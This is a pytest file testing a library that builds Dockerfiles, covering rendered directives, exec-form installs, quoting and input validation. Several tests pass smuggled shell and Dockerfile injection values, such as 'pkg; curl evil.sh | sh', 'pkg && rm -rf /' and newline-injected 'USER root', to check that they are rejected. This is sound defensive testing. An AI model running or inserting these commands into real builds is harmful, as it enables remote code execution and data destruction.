from __future__ import annotations

from pathlib import Path

import pytest

from containerspec import ImageSpec


class TestDockerfile:
    def test_rootless_apt_dockerfile(self) -> None:
        spec = (
            ImageSpec.from_registry("nvidia/cuda:13.3.0-devel-ubuntu24.04", pin_digest=False)
            .add_python("3.12")
            .apt_install("git", "build-essential")
            .uv_pip_install("vllm", "flashinfer==0.2.0")
            .pip_install("huggingface_hub[hf_transfer]")
            .env({"HF_HOME": "/home/warden/.cache/huggingface", "HF_HUB_ENABLE_HF_TRANSFER": "1"})
            .workdir("/app")
            .user(uid=1000, gid=1000, name="warden")
            .chown("/home/warden/.cache/huggingface")
            .entrypoint([])
        )
        actual = spec.to_dockerfile()
        expected = (Path(__file__).parent / "golden" / "rootless_apt_dockerfile.txt").read_text()
        assert actual == expected, f"Expected:\n{expected}\nActual:\n{actual}"

    def test_rootless_apk_dockerfile(self) -> None:
        spec = (
            ImageSpec.from_registry("alpine:3.20", pin_digest=False)
            .apk_install("openrc", "util-linux")
            .run_commands("ln -s agetty /etc/init.d/agetty.ttyS0")
            .env({"TERM": "linux"})
            .user(uid=1000, gid=1000, name="warden")
            .entrypoint([])
        )
        actual = spec.to_dockerfile()
        expected = (Path(__file__).parent / "golden" / "rootless_apk_dockerfile.txt").read_text()
        assert actual == expected, f"Expected:\n{expected}\nActual:\n{actual}"

    def test_root_dockerfile(self) -> None:
        spec = (
            ImageSpec.from_registry("nvidia/cuda:13.3.0-devel-ubuntu24.04", pin_digest=False)
            .add_python("3.12")
            .uv_pip_install("vllm")
            .env({"HF_HOME": "/root/.cache/huggingface"})
            .entrypoint([])
        )
        actual = spec.to_dockerfile()
        expected = (Path(__file__).parent / "golden" / "root_dockerfile.txt").read_text()
        assert actual == expected, f"Expected:\n{expected}\nActual:\n{actual}"

    def test_add_python_lines(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).add_python("3.12")
        df = spec.to_dockerfile()
        assert "COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/" in df
        assert "ENV UV_PYTHON_INSTALL_DIR=/opt/uv-python" in df
        assert "uv python install 3.12" in df
        assert "uv venv --python 3.12 /opt/venv" in df
        assert "ENV PATH=/opt/venv/bin:$PATH" in df

    def test_no_python_when_not_added(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).uv_pip_install("vllm")
        df = spec.to_dockerfile()
        assert "uv venv" not in df
        assert "PATH=/opt/venv" not in df

    def test_workdir(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).workdir("/app")
        df = spec.to_dockerfile()
        assert "WORKDIR /app" in df

    def test_entrypoint_clear(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).entrypoint([])
        df = spec.to_dockerfile()
        assert "ENTRYPOINT []" in df

    def test_entrypoint_none_omits(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).entrypoint(None)
        df = spec.to_dockerfile()
        assert "ENTRYPOINT" not in df

    def test_expose(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).expose(8000, 8080)
        df = spec.to_dockerfile()
        assert "EXPOSE 8000 8080" in df

    def test_cmd(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).cmd(["vllm", "serve", "model"])
        df = spec.to_dockerfile()
        assert 'CMD ["vllm", "serve", "model"]' in df

    def test_volume(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).volume("/data")
        df = spec.to_dockerfile()
        assert 'VOLUME ["/data"]' in df

    def test_copy(self, tmp_path) -> None:
        src = tmp_path / "init.sh"
        src.write_text("#!/bin/bash\necho hello")
        spec = ImageSpec.from_registry("base", pin_digest=False).copy(str(src), "/app/init.sh")
        df = spec.to_dockerfile()
        assert f"COPY {src} /app/init.sh" in df

    def test_copy_from_stage(self) -> None:
        builder = ImageSpec.from_registry("node:22", pin_digest=False).workdir("/app")
        stage = builder.with_stage("builder")
        runtime = (
            ImageSpec.from_registry("nginx:alpine", pin_digest=False)
            .copy_from_stage(stage, "/app/dist", "/usr/share/nginx/html")
            .expose(80)
        )
        df = runtime.to_dockerfile()
        assert "COPY --from=builder /app/dist /usr/share/nginx/html" in df
        assert "FROM node:22 AS builder" in df
        assert "FROM nginx:alpine" in df

    def test_cmd_none_renders_comment_only(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).cmd(None)
        df = spec.to_dockerfile()
        assert "# cmd(None)" in df
        assert "CMD " not in df

    def test_chown_explicit_uid_gid(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).chown("/data", uid=1000, gid=1000)
        df = spec.to_dockerfile()
        assert "chown -R 1000:1000 /data" in df

    def test_chown_only_uid_raises(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).chown("/data", uid=1000)
        with pytest.raises(ValueError, match="uid and gid must both be specified"):
            spec.to_dockerfile()

    def test_chown_no_user_layer_raises(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).chown("/data")
        with pytest.raises(ValueError, match=r"no preceding \.user\(\) layer"):
            spec.to_dockerfile()

    def test_user_name_rejects_shell_metacharacters(self) -> None:
        """A user name with shell metacharacters must not reach a RUN command."""
        spec = ImageSpec.from_registry("base", pin_digest=False).user(
            uid=1000, gid=1000, name="app; touch /pwned"
        )
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_add_python_version_rejects_shell_metacharacters(self) -> None:
        """An add_python version with shell metacharacters must not reach a RUN command."""
        spec = ImageSpec.from_registry("base", pin_digest=False).add_python("3.12; touch /pwned")
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_chown_path_rejects_shell_metacharacters(self) -> None:
        """A chown path with shell metacharacters must not reach a RUN command."""
        spec = (
            ImageSpec.from_registry("base", pin_digest=False)
            .user(uid=1000, gid=1000, name="app")
            .chown("/data; touch /pwned")
        )
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_workdir_rejects_shell_metacharacters(self) -> None:
        """A workdir path with shell metacharacters must not reach the Dockerfile."""
        spec = ImageSpec.from_registry("base", pin_digest=False).workdir("/app\nUSER root")
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_nvm_version_rejects_shell_metacharacters(self) -> None:
        """An nvm version with shell metacharacters must not reach a RUN command."""
        spec = ImageSpec.from_registry("base", pin_digest=False).nvm_install("20; touch /pwned")
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_copy_dest_rejects_newline_injection(self) -> None:
        """A copy dest with a newline must not inject a Dockerfile directive."""
        spec = ImageSpec.from_registry("base", pin_digest=False).copy(
            "app.py", "/app\nUSER root", content_hash="sha256:abc"
        )
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_copy_from_stage_rejects_newline_injection(self) -> None:
        """copy_from_stage src/dest must be guarded like copy (same directive sink)."""
        builder = ImageSpec.from_registry("node:22", pin_digest=False).with_stage("builder")
        spec = ImageSpec.from_registry("base", pin_digest=False).copy_from_stage(
            builder, "/dist", "/out\nUSER root"
        )
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_env_rejects_newline_injection(self) -> None:
        """An env value with a newline must not inject a Dockerfile directive."""
        spec = ImageSpec.from_registry("base", pin_digest=False).env({"A": "x\nUSER root"})
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_workdir_trailing_newline_rejected(self) -> None:
        """A trailing newline must be rejected (anchor uses fullmatch, not $)."""
        spec = ImageSpec.from_registry("base", pin_digest=False).workdir("/app\n")
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_copy_current_dir_and_globs_and_dotfiles_render(self) -> None:
        """Canonical COPY idioms — '.', globs, dotfiles, relative — must render."""
        for src in (".", "src/*.py", ".env", "../shared"):
            spec = ImageSpec.from_registry("base", pin_digest=False).copy(
                src, "/app", content_hash="sha256:abc"
            )
            assert f"COPY {src} /app" in spec.to_dockerfile()

    def test_chown_path_rejects_glob(self) -> None:
        """chown renders shell-form, so a glob would expand — reject it."""
        spec = (
            ImageSpec.from_registry("base", pin_digest=False)
            .user(uid=1000, gid=1000, name="app")
            .chown("/data/*")
        )
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_chown_path_rejects_tilde(self) -> None:
        """chown renders shell-form, so a tilde would expand — reject it."""
        spec = (
            ImageSpec.from_registry("base", pin_digest=False)
            .user(uid=1000, gid=1000, name="app")
            .chown("~other/data")
        )
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_workdir_rejects_glob(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).workdir("/app/*")
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_copy_glob_still_renders(self) -> None:
        """COPY globbing stays permitted — only the shell-form sinks reject globs."""
        spec = ImageSpec.from_registry("base", pin_digest=False).copy(
            "src/*.py", "/app", content_hash="sha256:abc"
        )
        assert "COPY src/*.py /app" in spec.to_dockerfile()

    def test_env_value_rejects_tab(self) -> None:
        """A tab in an env value can inject a second ENV assignment — reject it."""
        spec = ImageSpec.from_registry("base", pin_digest=False).env({"A": "x\tPATH=/evil"})
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_env_value_rejects_trailing_backslash(self) -> None:
        """A trailing backslash is a line-continuation that swallows the next directive."""
        spec = ImageSpec.from_registry("base", pin_digest=False).env({"A": "x\\"})
        with pytest.raises(ValueError):
            spec.to_dockerfile()

    def test_fs_path_allows_plus(self) -> None:
        """'+' is shell-inert, so chown/workdir paths like /opt/c++ must render."""
        df = ImageSpec.from_registry("base", pin_digest=False).workdir("/opt/c++").to_dockerfile()
        assert "WORKDIR /opt/c++" in df

    def test_env_interior_backslash_is_quoted(self) -> None:
        """A backslash in an env value must be escaped (quoted branch), not raw."""
        df = ImageSpec.from_registry("base", pin_digest=False).env({"A": "a\\b"}).to_dockerfile()
        assert 'ENV A="a\\\\b"' in df

    def test_env_key_allows_leading_underscore(self) -> None:
        """Common Unix env vars start with an underscore — must not be rejected."""
        df = (
            ImageSpec.from_registry("base", pin_digest=False)
            .env({"_JAVA_OPTIONS": "-Xmx1g"})
            .to_dockerfile()
        )
        assert "ENV _JAVA_OPTIONS=-Xmx1g" in df

    def test_version_aliases_render(self) -> None:
        """Real nvm/uv version selectors (lts/<name>, pypy@X) must not be rejected."""
        assert "nvm install lts/hydrogen" in (
            ImageSpec.from_registry("base", pin_digest=False)
            .nvm_install("lts/hydrogen")
            .to_dockerfile()
        )
        assert "uv python install pypy@3.10" in (
            ImageSpec.from_registry("base", pin_digest=False)
            .add_python("pypy@3.10")
            .to_dockerfile()
        )

    def test_ordinary_paths_and_names_still_render(self) -> None:
        """Legitimate names and paths must not be rejected by the validation."""
        spec = (
            ImageSpec.from_registry("base", pin_digest=False)
            .add_python("3.12")
            .workdir("/app")
            .user(uid=1000, gid=1000, name="warden")
            .chown("/home/warden/.cache")
        )
        df = spec.to_dockerfile()
        assert "chown -R 1000:1000 /home/warden/.cache" in df
        assert "WORKDIR /app" in df

    def test_brew_install(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).brew_install("jq")
        df = spec.to_dockerfile()
        assert '["brew", "install", "jq"]' in df

    def test_nvm_install(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).nvm_install("20")
        df = spec.to_dockerfile()
        assert "nvm install 20" in df
        assert "nvm-sh/nvm" in df

    def test_npm_install(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).npm_install("typescript")
        df = spec.to_dockerfile()
        assert '["npm", "install", "-g", "typescript"]' in df

    def test_dnf_install(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).dnf_install("git", "curl")
        df = spec.to_dockerfile()
        assert '["dnf", "install", "-y", "curl", "git"]' in df
        assert "--mount=type=cache,target=/var/cache/dnf" in df

    def test_env_value_with_spaces_quoted(self) -> None:
        """ENV values containing spaces are quoted to prevent corruption."""
        spec = ImageSpec.from_registry("base", pin_digest=False).env(
            {"FOO": "hello world", "BAR": "simple"}
        )
        df = spec.to_dockerfile()
        assert 'ENV FOO="hello world"' in df
        assert "ENV BAR=simple" in df

    def test_env_value_with_quote_escaped(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).env({"FOO": 'say "hi"'})
        df = spec.to_dockerfile()
        assert 'ENV FOO="say \\"hi\\""' in df

    def test_apt_install_has_debian_frontend_noninteractive(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).apt_install("git")
        df = spec.to_dockerfile()
        assert "DEBIAN_FRONTEND=noninteractive" in df

    def test_run_commands_chained_single_run(self) -> None:
        """Multiple run_commands produce a single RUN with && chaining."""
        spec = ImageSpec.from_registry("base", pin_digest=False).run_commands(
            "echo a", "echo b", "echo c"
        )
        df = spec.to_dockerfile()
        assert "RUN echo a && echo b && echo c" in df
        run_lines = [line for line in df.split("\n") if line.startswith("RUN ")]
        assert len(run_lines) == 1

    def test_invalid_package_name_raises(self) -> None:
        """Package names with shell metacharacters are rejected at render time."""
        from containerspec.renderers import validate_package

        with pytest.raises(ValueError, match="Invalid package name"):
            validate_package("pkg; curl evil.sh | sh")

    def test_valid_package_with_extras(self) -> None:
        """Package names with extras like huggingface_hub[hf_transfer] are valid."""
        from containerspec.renderers import validate_package

        assert validate_package("huggingface_hub[hf_transfer]") == "huggingface_hub[hf_transfer]"

    def test_pep508_version_specifiers_are_valid(self) -> None:
        """PEP 508 version specifiers are accepted (safe under exec-form RUN)."""
        from containerspec.renderers import validate_package

        for pkg in [
            "httpx>=0.27.0",
            "numpy<2.0",
            "rich>12.0",
            "packaging!=22.0",
            "uvicorn~=0.30",
            "fastapi[all]>=0.110,<0.120",
            "pydantic>=2.0,<3,!=2.5.0",
        ]:
            assert validate_package(pkg) == pkg

    def test_npm_scoped_and_semver_specifiers_are_valid(self) -> None:
        """npm scoped packages and semver range chars are accepted (exec-form safe)."""
        from containerspec.renderers import validate_package

        for pkg in [
            "@types/node",
            "@angular/core@^17.0.0",
            "typescript@~5.4.0",
            "react@#semver:^18.0.0",
        ]:
            assert validate_package(pkg) == pkg

    def test_shell_metacharacters_still_rejected(self) -> None:
        """Defense-in-depth: shell injection chars are rejected even with exec form."""
        from containerspec.renderers import validate_package

        for evil in [
            "pkg; curl evil.sh | sh",
            "pkg && rm -rf /",
            "pkg$(whoami)",
            "pkg`whoami`",
            "pkg > /etc/passwd",
            "pkg & background",
            "pkg$(curl evil)",
            "pkg $(id)",
            "name with spaces",
        ]:
            with pytest.raises(ValueError, match="Invalid package name"):
                validate_package(evil)

    def test_pip_install_renders_exec_form(self) -> None:
        """pip_install emits exec-form RUN with a JSON array (no shell)."""
        spec = ImageSpec.from_registry("base", pin_digest=False).pip_install("httpx")
        df = spec.to_dockerfile()
        assert '["pip", "install", "--no-cache-dir", "httpx"]' in df
        # No shell-form "pip install httpx" (space-separated) anywhere.
        assert "pip install --no-cache-dir httpx" not in df

    def test_pip_install_version_specifier_in_exec_form(self) -> None:
        """A PEP 508 specifier is carried verbatim inside the exec JSON array."""
        spec = ImageSpec.from_registry("base", pin_digest=False).pip_install("httpx>=0.27.0")
        df = spec.to_dockerfile()
        assert '["pip", "install", "--no-cache-dir", "httpx>=0.27.0"]' in df

    def test_apt_install_splits_into_env_update_install(self) -> None:
        """apt_install emits ENV + separate exec-form update and install RUN lines."""
        spec = ImageSpec.from_registry("base", pin_digest=False).apt_install("git", "curl")
        df = spec.to_dockerfile()
        assert "ENV DEBIAN_FRONTEND=noninteractive" in df
        assert '["apt-get", "update"]' in df
        assert '["apt-get", "install", "-y", "--no-install-recommends", "curl", "git"]' in df
        # The old shell-form chained command must be gone.
        assert "apt-get update && apt-get install" not in df

    def test_uv_pip_install_sets_env_then_exec(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).uv_pip_install("vllm")
        df = spec.to_dockerfile()
        assert "ENV UV_LINK_MODE=copy" in df
        assert '["uv", "pip", "install", "vllm"]' in df
        assert "UV_LINK_MODE=copy uv pip install" not in df

    def test_pacman_install_splits_install_and_clean(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).pacman_install("ripgrep")
        df = spec.to_dockerfile()
        assert '["pacman", "-S", "--noconfirm", "--needed", "ripgrep"]' in df
        assert '["pacman", "-Scc", "--noconfirm"]' in df

    def test_zypper_install_splits_install_and_clean(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).zypper_install("git")
        df = spec.to_dockerfile()
        assert '["zypper", "install", "-y", "git"]' in df
        assert '["zypper", "clean", "-a"]' in df

    def test_dnf_install_splits_install_and_clean(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).dnf_install("git")
        df = spec.to_dockerfile()
        assert '["dnf", "install", "-y", "git"]' in df
        assert '["dnf", "clean", "all"]' in df

    def test_pnpm_install_splits_pnpm_bootstrap_and_add(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).pnpm_install("react")
        df = spec.to_dockerfile()
        assert '["npm", "install", "-g", "pnpm"]' in df
        assert '["pnpm", "add", "-g", "react"]' in df

    def test_brew_install_setup_shell_then_exec_packages(self) -> None:
        """brew keeps its setup script in shell form; packages use exec form."""
        spec = ImageSpec.from_registry("base", pin_digest=False).brew_install("jq", "yq")
        df = spec.to_dockerfile()
        # Setup script remains shell-form (library code, no user input).
        assert "command -v brew" in df
        # Packages are installed via exec form, after ENV PATH.
        assert "ENV PATH=/home/linuxbrew/.linuxbrew/bin:$PATH" in df
        assert '["brew", "install", "jq", "yq"]' in df
        # No shell-form "brew install jq yq" with the user packages.
        assert "brew install jq yq" not in df

    def test_apk_install_renders_exec_form(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).apk_install("curl", "git")
        df = spec.to_dockerfile()
        assert '["apk", "add", "--no-cache", "curl", "git"]' in df
        assert "apk add --no-cache curl git" not in df

    def test_nvm_install_has_pipefail(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).nvm_install("22")
        df = spec.to_dockerfile()
        assert 'SHELL ["/bin/bash", "-o", "pipefail", "-c"]' in df

    def test_rust_install_has_pipefail(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).rust_install()
        df = spec.to_dockerfile()
        assert 'SHELL ["/bin/bash", "-o", "pipefail", "-c"]' in df

    def test_brew_install_has_pipefail(self) -> None:
        spec = ImageSpec.from_registry("base", pin_digest=False).brew_install("jq")
        df = spec.to_dockerfile()
        assert 'SHELL ["/bin/bash", "-o", "pipefail", "-c"]' in df
